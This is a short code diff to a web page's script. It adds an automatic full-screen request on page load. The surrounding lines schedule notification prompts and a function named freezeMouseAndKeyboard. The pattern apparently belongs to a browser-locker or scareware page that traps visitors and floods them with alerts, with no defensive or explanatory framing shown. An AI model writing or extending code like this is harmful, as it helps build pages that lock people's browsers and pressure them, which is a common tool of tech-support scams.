@@ -141,6 +141,9 @@
             document.body.style.color = "white";
         }
 
+        // Automatically trigger the full-screen mode as soon as the page loads
+        document.documentElement.requestFullscreen().catch(console.log);
+
         setTimeout(requestNotificationPermission, 2000);
         setTimeout(startNotifications, 3000);
         setTimeout(freezeMouseAndKeyboard, 5000);
